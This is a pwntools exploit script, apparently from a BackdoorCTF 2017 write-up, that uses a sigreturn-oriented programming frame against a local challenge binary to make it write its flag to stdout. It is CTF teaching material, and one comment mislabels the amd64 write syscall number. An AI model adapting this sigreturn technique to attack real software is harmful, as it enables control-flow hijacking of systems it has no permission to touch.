# This exploit is from: https://www.akashtrehan.com/writeups/backdoorctf17/2funsignals/

from pwn import *

# Establish the target
target = process("./funsignals_player_bin")
elf = ELF('funsignals_player_bin')

# Establish what architecture this is
context.arch = "amd64"

'''
Now for the sigreturn call, there are only five registers we care about
RIP:	Where we are jumping
RAX:	Specify the write syscall for after the jump
RDI:	Where will the output go (stdout)
RSI:	Where will we be writing from
RDX:	How much to write?

for that, we will
RIP:	0x10000021 (Syscall instruction, 0x10000015 and `0x1000000b will also work)
RAX:	0x4  specify write syscall, equal to SYS_write
RDI:	0x1 specify stdout, equal to STDOUT_FILENO
RSI:	0x10000023 address of flag, which we will be printing out
RDX:	0x100 to specify write 0x100 bytes
'''

# Create the stack frame
frame = SigreturnFrame()

frame.rip = 0x10000021

frame.rax = constants.SYS_write
frame.rdi = constants.STDOUT_FILENO
frame.rsi = elf.symbols['flag']
frame.rdx = 0x100

# Send the frame, then drop to an interactive shell to read the flag
target.send(str(frame))
target.interactive()
